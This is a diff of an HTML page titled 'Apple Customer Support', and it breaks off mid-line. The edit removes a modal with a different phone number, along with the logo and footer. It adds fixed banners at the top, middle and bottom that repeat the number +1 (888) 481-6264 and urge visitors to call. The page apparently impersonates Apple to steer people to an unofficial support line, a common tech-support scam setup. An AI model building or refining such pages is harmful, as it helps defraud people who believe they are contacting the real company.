@@ -11,11 +11,48 @@
       background-color: #f4f4f4;
       margin: 0;
       padding: 0;
+      position: relative; /* To position banners */
     }
 
-    .container {
+    /* Banner styles */
+    .banner {
+      background-color: #007aff; /* Blue color for the banner */
+      color: white;
+      padding: 15px;
       text-align: center;
-      padding: 50px;
+      position: fixed;
+      left: 0;
+      right: 0;
+      z-index: 1000; /* Ensures banners are on top of other content */
+    }
+
+    .banner.top {
+      top: 0;
+    }
+
+    .banner.middle {
+      top: 50%;
+      transform: translateY(-50%);
+    }
+
+    .banner.bottom {
+      bottom: 0;
+    }
+
+    .close-banner {
+      background-color: transparent;
+      color: white;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+      position: absolute;
+      right: 10px;
+      top: 5px;
+    }
+
+    .center-content {
+      text-align: center;
+      padding: 150px 20px; /* Adjusted padding to avoid overlap with banners */
     }
 
     h1 {
@@ -43,23 +80,9 @@
       background-color: #005bb5;
     }
 
-    footer {
-      margin-top: 50px;
-      color: #888;
-    }
-
-    /* Center Content in Middle */
-    .center-content {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      text-align: center;
-    }
-
     /* Modal Styles */
     .modal {
-      display: none;
+      display: none; /* Initially hidden */
       position: fixed;
       left: 0;
       top: 0;
@@ -93,53 +116,35 @@
     .close-btn:hover {
       color: #007aff;
     }
-
-    /* Apple Logo */
-    .logo {
-      max-width: 100px;
-      margin-bottom: 20px;
-    }
-
   </style>
 </head>
 <body>
 
+  <!-- Top Banner -->
+  <div class="banner top" id="bannerTop">
+    <button class="close-banner" onclick="closeBanner('bannerTop')">×</button>
+    <strong>Toll-Free Support Available: +1 (888) 481-6264</strong>
+  </div>
+
   <div class="center-content">
-    <!-- Apple Logo -->
-    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
-    
     <h1>Apple Customer Support</h1>
     <p>Need help with your Apple device? Call us now for support!</p>
-    
+
+    <!-- Middle Banner -->
+    <div class="banner middle" id="bannerMiddle">
+      <button class="close-banner" onclick="closeBanner('bannerMiddle')">×</button>
+      <strong>24/7 Customer Support: +1 (888) 481-6264</strong>
+    </div>
+
     <!-- Button to trigger the pop-up -->
     <button class="call-button" onclick="showPopup()">Call Now</button>
   </div>
 
-  <!-- Modal (Pop-Up) -->
-  <div id="myModal" class="modal">
-    <div class="modal-content">
-      <!-- Close button in the top right corner -->
-      <button class="close-btn" onclick="closePopup()">×</button>
-      <p>Call Now: <a href="tel:+18006927753">+1-800-692-7753</a></p>
-    </div>
+  <!-- Bottom Banner -->
+  <div class="banner bottom" id="bannerBottom">
+    <button class="close-banner" onclick="closeBanner('bannerBottom')">×</button>
+    <strong>Reach Us Anytime: +1 (888) 481-6264</strong>
   </div>
 
-  <footer>
-    <p>© 2024 Apple Inc. All rights reserved.</p>
-  </footer>
-
-  <!-- JavaScript functions -->
-  <script>
-    // Function to display the pop-up
-    function showPopup() {
-      document.getElementById('myModal').style.display = 'flex';
-    }
-
-    // Function to close the pop-up
-    function closePopup() {
-      document.getElementById('myModal').style.display = 'none';
-    }
-  </script>
-
-</body>
-</html>
+  <!-- Modal (Pop-Up) -->
+  <div id="myModal" class="
